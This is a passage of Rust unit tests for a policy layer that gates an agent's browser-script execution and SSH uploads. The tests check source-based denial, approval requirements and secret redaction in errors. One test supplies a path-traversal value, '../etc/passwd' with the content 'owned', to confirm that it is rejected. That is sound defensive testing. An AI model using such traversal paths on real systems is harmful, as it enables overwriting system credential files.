            ToolExecutionSource::Unknown,
            Some("session-1"),
            None,
            None,
            None,
        )
        .expect_err("unknown source should be denied");

        assert!(error.to_string().contains("denied by policy"));
    }

    #[test]
    fn cdp_execute_script_allows_trusted_internal_overlay_for_headless_agent() {
        enforce_cdp_execute_script_policy(
            "tool-1",
            "(function(){ if(document.getElementById('__ppa_overlay__'))return; })();",
            ToolExecutionSource::HeadlessAgent,
            None,
            None,
            None,
            None,
        )
        .expect("trusted overlay script should be allowed for headless agent");
    }

    #[test]
    fn cdp_execute_script_manual_user_arbitrary_requires_approval() {
        let error = enforce_cdp_execute_script_policy(
            "tool-1",
            "window.alert('manual')",
            ToolExecutionSource::UserRequestedCommand,
            Some("session-1"),
            None,
            None,
            None,
        )
        .expect_err("manual user arbitrary script without approval should be rejected");

        assert!(error.to_string().contains("approval"));
        assert!(!error.to_string().contains("manual"));
    }

    #[test]
    fn cdp_execute_script_denies_secret_leak_in_error_message() {
        let secret_script = "const token = 'super-secret-token'; token;";
        let error = enforce_cdp_execute_script_policy(
            "tool-1",
            secret_script,
            ToolExecutionSource::Unknown,
            Some("session-1"),
            None,
            None,
            None,
        )
        .expect_err("unknown arbitrary script should be denied");

        let message = error.to_string();
        assert!(message.contains("denied by policy"));
        assert!(!message.contains("super-secret-token"));
    }

    #[test]
    fn ssh_upload_rejects_remote_path_escape() {
        let mut request = make_request("ssh_upload_file");
        request.source = ToolExecutionSource::AssistantToolCall;
        request.arguments = serde_json::json!({
            "remoteWorkDir": "/srv/project",
            "remotePath": "../etc/passwd",
            "content": "owned"
        })
        .to_string();

        let error = preview_request_policy(
            &request,
            &serde_json::json!({
                "remoteWorkDir": "/srv/project",
                "remotePath": "../etc/passwd",
                "content": "owned"
            }),
            Some("session-1"),
        )
        .expect_err("remote path escape should be rejected");

        assert!(error.to_string().contains("outside remote root"));
    }
}
